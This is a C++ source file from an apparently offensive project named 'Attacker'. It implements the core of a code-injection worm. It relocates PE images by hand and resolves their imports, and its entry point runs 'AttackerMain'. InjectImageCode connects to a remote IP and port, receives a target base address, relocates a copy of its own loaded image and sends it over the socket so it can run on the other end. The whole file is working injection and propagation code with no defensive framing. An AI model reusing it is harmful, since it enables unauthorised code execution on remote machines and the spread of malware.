// ImgCode.cpp : 定义image的入口点以及将image注入目标所需的函数。
//

#include "Attacker.h"



void RelocImage(LPBYTE pImage, DWORD dwOldBase, DWORD dwNewBase)
{
	PIMAGE_DOS_HEADER pidh = (PIMAGE_DOS_HEADER)pImage;
	PIMAGE_NT_HEADERS pinh = (PIMAGE_NT_HEADERS)(pImage + pidh->e_lfanew);
	LPBYTE pRelocTbl = pImage + pinh->OptionalHeader.DataDirectory[5].VirtualAddress;
	DWORD dwRelocOffset = dwNewBase - dwOldBase;

	DWORD dwRva = 0, dwRvaCount = 0;
	WORD* arrOffset = NULL;
	PIMAGE_BASE_RELOCATION pibr = (PIMAGE_BASE_RELOCATION)pRelocTbl;

	while(pibr->VirtualAddress != NULL)
	{
		arrOffset = (WORD*)(pRelocTbl + sizeof(IMAGE_BASE_RELOCATION));
		dwRvaCount = (pibr->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / 2;
		for(DWORD i=0; i<dwRvaCount; i++)
		{
			dwRva = arrOffset[i];
			if((dwRva & 0xf000) != 0x3000)
				continue;
			dwRva &= 0x0fff;
			dwRva += pibr->VirtualAddress + (DWORD)pImage;
			*(DWORD*)dwRva += dwRelocOffset;
		}
		pRelocTbl += pibr->SizeOfBlock;
		pibr = (PIMAGE_BASE_RELOCATION)pRelocTbl;
	}
}



BOOL LoadImportFx(LPBYTE pBase, FxLoadLibrary fnLoadLibrary, FxGetProcAddr fnGetProcAddr)
{
	PIMAGE_DOS_HEADER pidh = (PIMAGE_DOS_HEADER)pBase;
	PIMAGE_NT_HEADERS pinh = (PIMAGE_NT_HEADERS)(pBase + pidh->e_lfanew);
	PIMAGE_IMPORT_DESCRIPTOR piid = (PIMAGE_IMPORT_DESCRIPTOR)
		(pBase + pinh->OptionalHeader.DataDirectory[1].VirtualAddress);

	for(; piid->OriginalFirstThunk != 0; piid++)
	{
		HMODULE hDll = fnLoadLibrary((LPCSTR)(pBase + piid->Name));
		if(hDll == NULL)
			return FALSE;

		PIMAGE_THUNK_DATA pOrigin = (PIMAGE_THUNK_DATA)(pBase + piid->OriginalFirstThunk);
		PIMAGE_THUNK_DATA pFirst = (PIMAGE_THUNK_DATA)(pBase + piid->FirstThunk);

		LPCSTR pFxName = NULL;
		PIMAGE_IMPORT_BY_NAME piibn = NULL;

		for(; pOrigin->u1.Ordinal != 0; pOrigin++, pFirst++)
		{
			if(pOrigin->u1.Ordinal & IMAGE_ORDINAL_FLAG)
				pFxName = (LPCSTR)IMAGE_ORDINAL(pOrigin->u1.Ordinal);
			else
			{
				piibn = (PIMAGE_IMPORT_BY_NAME)(pBase + pOrigin->u1.AddressOfData);
				pFxName = (LPCSTR)piibn->Name;
			}
			pFirst->u1.Function = (DWORD)fnGetProcAddr(hDll, pFxName);
			if(pFirst->u1.Function == NULL)
				return FALSE;
		}
	}

	return TRUE;
}



void WINAPI AttackerEntry(LPBYTE pImage, FxLoadLibrary fnLoadLibrary, FxGetProcAddr fnGetProcAddr)
{
	g_hInst = (HINSTANCE)pImage;
	if(LoadImportFx(pImage, fnLoadLibrary, fnGetProcAddr))
		AttackerMain(g_hInst);
	ExitProcess(0);
}



BOOL DoInject(SOCKET sck, LPBYTE pImage, DWORD dwImageSize)
{
	DWORD dwSize = 0;
	while(dwSize < dwImageSize)
	{
		if(send(sck, (const char*)(pImage + dwSize), 1024, 0) != 1024)
			return FALSE;
		dwSize += 1024;
	}

	return TRUE;
}


BOOL InjectImageCode(DWORD dwIpAddr, int nPort)
{
	BOOL bOk = FALSE;
	LPBYTE pImage = NULL;
	DWORD dwNewBase = 0, dwSize = 0;
	HINSTANCE hInst = NULL;
	SOCKET sck = INVALID_SOCKET;
	sockaddr_in sa;

	__try
	{
		if((sck = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET)
			__leave;

		sa.sin_family = AF_INET;
		sa.sin_port = 0;
		sa.sin_addr.s_addr = INADDR_ANY;
		if(bind(sck, (sockaddr *)&sa, sizeof(sa)) != 0)
			__leave;

		sa.sin_port = htons((u_short)nPort);
		sa.sin_addr.s_addr = htonl(dwIpAddr);
		if(connect(sck, (sockaddr *)&sa, sizeof(sa)) != 0)
			__leave;

		if((recv(sck, (char*)(&dwNewBase), sizeof(DWORD), 0) != sizeof(DWORD))
			|| (dwNewBase == 0))
			__leave;

		dwSize = GetImageSize((LPCBYTE)g_hInst);
		pImage = (LPBYTE)VirtualAlloc(NULL, dwSize,	MEM_COMMIT, PAGE_READWRITE);
		if(pImage == NULL)
			__leave;

		memcpy(pImage, (const void*)g_hInst, dwSize);

		RelocImage(pImage, (DWORD)g_hInst, dwNewBase);
		if(!DoInject(sck, pImage, dwSize))
			__leave;

		bOk = TRUE;
	}
	__finally
	{
		if(sck != INVALID_SOCKET)
			closesocket(sck);
		if(pImage != NULL)
			VirtualFree(pImage, 0, MEM_RELEASE);
	}

	return bOk;
}
